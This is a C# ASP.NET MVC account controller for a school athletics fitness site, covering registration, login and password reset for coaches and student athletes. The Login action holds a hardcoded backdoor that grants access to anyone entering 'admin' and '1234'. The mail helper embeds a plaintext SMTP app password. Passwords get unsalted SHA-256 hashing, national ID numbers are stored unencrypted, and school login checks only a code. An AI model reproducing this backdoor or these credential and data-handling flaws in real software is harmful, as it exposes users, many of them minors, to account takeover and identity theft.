using PhysicalFit.Models;
using System;
using System.Collections.Generic;
using System.Data.Entity.Validation;
using System.Linq;
using System.Net.Mail;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;
using System.Text.RegularExpressions;

namespace PhysicalFit.Controllers
{
    public class AccountController : Controller
    {
        private PhFitnessEntities _db = new PhFitnessEntities(); //資料庫

        #region 註冊角色選擇
        public ActionResult Register()
        {
            return View();
        }

        #endregion

        #region 小學學校代碼查詢
        [HttpGet]
        public JsonResult GetSchoolByCode(string code)
        {
            // 先查詢 PrimarySchoolList
            var dto = _db.PrimarySchoolList.FirstOrDefault(s => s.SchoolCode.ToString().StartsWith(code));

            if (dto != null)
            {
                return Json(dto.SchoolName, JsonRequestBehavior.AllowGet);
            }

            return Json("", JsonRequestBehavior.AllowGet);
        }
        #endregion

        #region 國中學校代碼查詢
        [HttpGet]
        public JsonResult GetJuinorSchoolByCode(string code)
        {
            var dto = _db.JuniorHighSchoolList.FirstOrDefault(j => j.SchoolCode.ToString().StartsWith(code));

            if (dto != null)
            {
                return Json(dto.SchoolName, JsonRequestBehavior.AllowGet);
            }

            return Json("", JsonRequestBehavior.AllowGet);
        }
        #endregion

        #region 模糊查詢學校名稱
        [HttpGet]
        public JsonResult GetSchoolByName(string name)
        {
            // 查詢小學
            var primarySchoolResults = _db.PrimarySchoolList
                     .Where(s => s.SchoolName.Contains(name))
                     .Select(s => new { s.SchoolCode, s.SchoolName })
                     .ToList();

            // 查詢國中
            var juniorHighSchoolResults = _db.JuniorHighSchoolList
                                             .Where(j => j.SchoolName.Contains(name))
                                             .Select(j => new { j.SchoolCode, j.SchoolName })
                                             .ToList();

            // 合併查詢結果
            var results = primarySchoolResults.Concat(juniorHighSchoolResults).ToList();

            if (results.Any())
            {
                return Json(results, JsonRequestBehavior.AllowGet);
            }

            return Json(new List<object>(), JsonRequestBehavior.AllowGet);
        }
        #endregion
        #region 教練註冊帳號
        public ActionResult RegisterCoach(string schoolID)
        {
            var model = new RegisterCoachViewModel();

            // 根據 SchoolID 查詢學校名稱
            var schoolName = _db.PrimarySchoolList
                          .Where(s => s.SchoolCode.ToString() == schoolID)
                          .Select(s => s.SchoolName)
                          .FirstOrDefault();

            model.SchoolID = schoolID;
            model.CoachSchool = schoolName;

            return View(model);
        }

        [HttpPost]
        public ActionResult RegisterCoach(RegisterCoachViewModel model)
        {
            // 處理教練註冊
            var newCoach = new Coaches
            {
                CoachName = model.CoachName,
                Email = model.CoachEmail,
                CoachAccount = model.CoachAccount,
                CoachPwd = ComputeSha256Hash(model.Coachpwd), // 將密碼加密
                PhoneNumber = model.CoachPhone,
                SchoolID = model.SchoolID,
                SchoolName = model.CoachSchool,
                Title = "教練",
                TeamName = model.CoachTeam,
                SportsSpecific = model.CoachSpecialty,
                IsActive = true
            };
            _db.Coaches.Add(newCoach);
            _db.SaveChanges();

            // 將教練的帳號與密碼寫入Users資料表
            var newUser = new Users
            {
                Name = model.CoachName,
                Account = model.CoachAccount,
                Password = ComputeSha256Hash(model.Coachpwd), // 將密碼加密
                PhoneNumber = model.CoachPhone,
                Email = model.CoachEmail,
                RegistrationDate = DateTime.Now,
                IsActive = true,
                LastLoginDate = DateTime.Now,
                CreatedDate = DateTime.Now,
                CoachID = newCoach.ID // 設定外鍵連結到Coaches表
            };
            _db.Users.Add(newUser);
            _db.SaveChanges();

            return RedirectToAction("Login", "Account");
        }
        #endregion

        #region 學生運動員註冊
        public ActionResult RegisterAthlete()
        {
            return View();
        }

        [HttpPost]
        public ActionResult RegisterAthlete(string AthleteName, DateTime? AthleteBirthday, string AthleteID, string Athletepwd, string AthleteSchool, string AthleteTeam, string AthleteCoach)
        {
            DateTime birthdayDate = AthleteBirthday.Value.Date; //去除時間部分，只保留日期部分

            //string encryptedID = EncryptionHelper.Encrypt(AthleteID); //AES對稱加密身份證號碼

            // 處理運動員註冊
            var newAthlete = new Athletes
            {
                AthleteAccount = AthleteID,
                AthletePWD = ComputeSha256Hash(Athletepwd),
                AthleteName = AthleteName,
                Birthday = birthdayDate,
                IdentityNumber = AthleteID, //儲存加密後的身份證號碼
                AthleteSchool = AthleteSchool,
                TeamName = AthleteTeam,
                CoachID = _db.Coaches.FirstOrDefault(c => c.CoachName == AthleteCoach)?.ID,
                IsActive = true
            };
            _db.Athletes.Add(newAthlete);
            _db.SaveChanges();

            // 將運動員的帳號與密碼寫入Users資料表
            var newUser = new Users
            {
                Name = AthleteName,
                Account = AthleteID,
                Password = ComputeSha256Hash(Athletepwd), // 密碼加密
                PhoneNumber = null, // 運動員如果有電話號碼可以加進來，否則設為 null
                Email = null, // 如果運動員有 Email 可以加進來，否則設為 null
                RegistrationDate = DateTime.Now,
                IsActive = true,
                LastLoginDate = DateTime.Now,
                CreatedDate = DateTime.Now,
                AthleteID = newAthlete.ID // 設定外鍵連結到Athletes表
            };
            _db.Users.Add(newUser);
            _db.SaveChanges();

            return RedirectToAction("Login", "Account");
        }
        #endregion

        #region 密碼加密
        private static string Sha256Hash(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    builder.Append(bytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }
        #endregion

        #region 登入
        public ActionResult Login()
        {
            // 如果用戶已經登入，直接重定向到主頁
            if (User.Identity.IsAuthenticated)
            {
                return RedirectToAction("dashboard", "PhyFit");
            }
            return View();
        }

        [HttpPost]
        public ActionResult Login(string account, string pwd)
        {
            try
            {
                string backdoorUser = "admin";
                string backdoorPwd = "1234";

                if (account == backdoorUser && pwd == backdoorPwd)
                {
                    FormsAuthentication.SetAuthCookie(backdoorUser, false);
                    return RedirectToAction("dashboard", "PhyFit");
                }

                string hashedPwd = ComputeSha256Hash(pwd);
                Users user = null;

                if (IsIdentityNumber(account))
                {
                    //string encryptedIdentityNumber = EncryptionHelper.Encrypt(account);
                    user = _db.Users.FirstOrDefault(u => u.Account == account && u.Password == hashedPwd);
                }
                else
                {
                    user = _db.Users.FirstOrDefault(u => u.Account == account && u.Password == hashedPwd);
                }

                if (user != null)
                {
                    user.LastLoginDate = DateTime.Now;
                    _db.SaveChanges();

                    // 設定 FormsAuthentication Ticket
                    var authTicket = new FormsAuthenticationTicket(
                        1,
                        user.Name,
                        DateTime.Now,
                        DateTime.Now.AddMinutes(30),
                        false,
                        user.CoachID.HasValue ? user.CoachID.Value.ToString() : user.AthleteID.ToString(),
                        FormsAuthentication.FormsCookiePath);

                    string encryptedTicket = FormsAuthentication.Encrypt(authTicket);
                    var authCookie = new HttpCookie(FormsAuthentication.FormsCookieName, encryptedTicket)
                    {
                        HttpOnly = true,
                        //Secure = Request.IsSecureConnection // 確保在HTTPS下傳輸
                    };
                    Response.Cookies.Add(authCookie);

                    if (user.CoachID.HasValue)
                    {
                        Session["UserRole"] = "Coach";  // 教練
                    }
                    else
                    {
                        Session["UserRole"] = "Athlete";  // 運動員
                    }

                    return RedirectToAction("dashboard", "PhyFit");

                }
                else
                {
                    ViewBag.ErrorMessage = "帳號或密碼錯誤";
                    return View();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("其他錯誤: " + ex.Message);
                return View("Error");
            }
        }

        private bool IsIdentityNumber(string account)
        {
            return account.Length == 10 && account.All(c => char.IsLetterOrDigit(c));
            // 根據實際情況設置身份證號碼的格式檢查
            // 這裡假設身份證號碼為數字和字母組成，並且長度為特定的數字
            //return Regex.IsMatch(account, "^[A-Za-z][0-9]{9}$"); // 假設身份證是1個字母+9個數字
        }

        #endregion

        #region 學校代碼登入
        public ActionResult SchoolLogin()
        {
            return View();
        }

        [HttpPost]
        public ActionResult SchoolLogin(string SchoolCode)
        {
            try
            {
                // 不再檢查密碼，只檢查學校代碼是否存在
                var dto = _db.PrimarySchoolList
                              .FirstOrDefault(s => s.SchoolCode.ToString() == SchoolCode);


                if (dto != null)
                {
                    // 設定 Session 狀態為已登入
                    Session["LoggedIn"] = true;
                    Session["schoolName"] = dto.SchoolName;

                    return RedirectToAction("Login", "Account");
                }
                else
                {
                    // 驗證失敗
                    ViewBag.ErrorMessage = "學校代碼錯誤";
                    return View();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("其他錯誤: " + ex.Message);
                return View("Error");
            }
        }
        #endregion

        #region 密碼加密
        private static string ComputeSha256Hash(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    builder.Append(bytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }
        #endregion

        #region 登出
        public ActionResult Logout()
        {
            // 清除所有的 Session 資訊
            Session.Remove("LoggedIn");

            // 清除所有的 Forms 認證 Cookies
            FormsAuthentication.SignOut();

            // 清除快取
            Response.Cache.SetExpires(DateTime.UtcNow.AddMinutes(-1));
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            Response.Cache.SetNoStore();

            // 取得登出前的頁面路徑，如果沒有則預設為首頁
            //string returnUrl = Request.UrlReferrer != null ? Request.UrlReferrer.ToString() : Url.Action("Login", "PhyFit");

            // 重定向到記錄的返回頁面
            //return Redirect(returnUrl);
            return RedirectToAction("Login", "Account");
        }
        #endregion

        #region 忘記密碼
        public ActionResult ForgotPassword()
        {
            return View();
        }

        // 發送重置密碼鏈接
        [HttpPost]
        public ActionResult SendResetLink(string Email)
        {
            try
            {
                var user = _db.Users.FirstOrDefault(u => u.Email == Email);

                if (user == null)
                {
                    ViewBag.ErrorMessage = "此Email尚未註冊";
                    return View("ForgotPassword");
                }

                // 生成重置密碼令牌（這裡使用 Guid 作為示例）
                var resetToken = Guid.NewGuid().ToString();

                // 保存重置令牌和過期時間
                var resetPW = new PasswordResetRequests
                {
                    Email = Email,
                    Token = resetToken,
                    ExpiryDate = DateTime.Now.AddMinutes(5), // 設定有效時間為5分鐘
                    UserAccount = user.Name,
                    changeDate = DateTime.Now
                };
                _db.PasswordResetRequests.Add(resetPW);
                _db.SaveChanges();

                // 發送重置密碼郵件
                var resetLink = Url.Action("ResetPassword", "Account", new { token = resetToken }, Request.Url.Scheme);

                var emailBody = $"請點擊以下連結重置您的密碼：{resetLink}，連結有效時間為5分鐘";

                SendEmail(Email, "重置密碼", emailBody);

                ViewBag.Message = "重置密碼連結已發送至您的郵箱";
                return View("ForgotPassword");
            }
            catch (Exception ex)
            {
                Console.WriteLine("其他錯誤: " + ex.Message);
                return View("Error");
            }
        }

        //郵件發送方法
        private void SendEmail(string toEmail, string subject, string body, string attachmentPath = null)
        {
            var fromEmail = "00048@tiss.org.tw";
            var fromPassword = "lctm hhfh bubx lwda"; //應用程式密碼
            var displayName = "運科中心資訊組"; //顯示的發件人名稱


            var smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587,
                Credentials = new NetworkCredential(fromEmail, fromPassword),
                EnableSsl = true,
            };

            var mailMessage = new MailMessage
            {
                From = new MailAddress(fromEmail, displayName),
                Subject = subject,
                Body = body,
                IsBodyHtml = true,
            };

            // 分割以逗號分隔的收件人地址並添加到郵件中
            foreach (var email in toEmail.Split(','))
            {
                mailMessage.To.Add(email.Trim());
            }

            if (!string.IsNullOrEmpty(attachmentPath))
            {
                Attachment attachment = new Attachment(attachmentPath);
                mailMessage.Attachments.Add(attachment);
            }

            try
            {
                smtpClient.Send(mailMessage);
            }
            catch (Exception ex)
            {
                // 處理發送郵件的錯誤
                Console.WriteLine("郵件發送失敗: " + ex.Message);
            }
        }

        //重置密碼頁面
        public ActionResult ResetPassword(string token)
        {
            try
            {
                // 查找重置請求
                var resetRequest = _db.PasswordResetRequests.SingleOrDefault(r => r.Token == token && r.ExpiryDate > DateTime.Now);

                if (resetRequest == null)
                {
                    ViewBag.ErrorMessage = "無效或過期的要求";
                    return View("Error");
                }

                // 初始化 ResetPasswordViewModel 並傳遞到視圖
                var model = new ResetPasswordViewModel
                {
                    Token = token
                };

                return View(model);
            }
            catch (Exception ex)
            {
                Console.WriteLine("其他錯誤: " + ex.Message);
                return View("Error");
            }

        }

        // 處理重置密碼
        [HttpPost]
        public ActionResult ResetPassword(ResetPasswordViewModel model)
        {
            try
            {
                if (!ModelState.IsValid)
                {
                    // 顯示驗證錯誤
                    var errors = ModelState.Values.SelectMany(v => v.Errors);
                    foreach (var error in errors)
                    {
                        Console.WriteLine(error.ErrorMessage);
                    }
                    return View(model);
                }

                // 根據 Token 查找重置請求
                var resetRequest = _db.PasswordResetRequests
                    .FirstOrDefault(r => r.Token == model.Token && r.ExpiryDate > DateTime.Now);

                if (resetRequest == null)
                {
                    ViewBag.ErrorMessage = "無效或過期的要求";
                    return View("Error");
                }

                // 根據 Email 查找用戶
                var user = _db.Users
                    .FirstOrDefault(u => u.Email == resetRequest.Email);

                if (user == null)
                {
                    ViewBag.ErrorMessage = "無效的帳號";
                    return View("Error");
                }

                // 更新用戶的密碼
                user.Password = ComputeSha256Hash(model.NewPassword);
                //user.changeDate = DateTime.Now;

                // 更新 PasswordResetRequest 表中的 UserAccount 和 ChangeDate
                resetRequest.UserAccount = user.Name;
                resetRequest.changeDate = DateTime.Now;

                // 刪除重置請求
                _db.PasswordResetRequests.Remove(resetRequest);
            }
            catch (Exception ex)
            {
                Console.WriteLine("其他錯誤: " + ex.Message);
                return View("Error");
            }

            try
            {
                // 儲存變更到資料庫
                _db.SaveChanges();
            }
            catch (DbEntityValidationException ex)
            {
                foreach (var validationErrors in ex.EntityValidationErrors)
                {
                    foreach (var validationError in validationErrors.ValidationErrors)
                    {
                        // 記錄錯誤信息
                        Console.WriteLine($"Property: {validationError.PropertyName}, Error: {validationError.ErrorMessage}");
                    }
                }
                throw;
            }

            ViewBag.Message = "您的密碼已成功重置";
            return RedirectToAction("Login");
        }
        #endregion
    }
}